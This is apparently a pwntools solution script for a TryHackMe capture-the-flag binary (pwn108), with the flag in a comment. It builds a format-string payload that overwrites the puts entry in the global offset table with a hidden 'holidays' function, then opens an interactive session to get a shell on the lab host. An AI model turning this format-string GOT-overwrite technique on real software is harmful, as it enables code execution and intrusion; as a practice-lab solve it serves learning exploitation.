#THM{7urN3d_puts_in70_win}
from pwn import *

host  = '10.10.85.252' 
port = 9008
exe = 'pwn108-1644300489260.pwn108'
elf = ELF(exe)
context.binary = elf
context.log_level = "debug"
p = remote(host, port)
# p = elf.process()

p.recvuntil(b'[Your name]: ')
p.sendline(b'haha')
p.recvuntil(b'[Your Reg No]: ')
offset = 10 # used pwndbg to find it
puts = elf.got.puts
holidays = elf.functions['holidays']
payload = fmtstr_payload(offset, {puts: holidays})
p.sendline(payload)

#got a shell ?
p.interactive()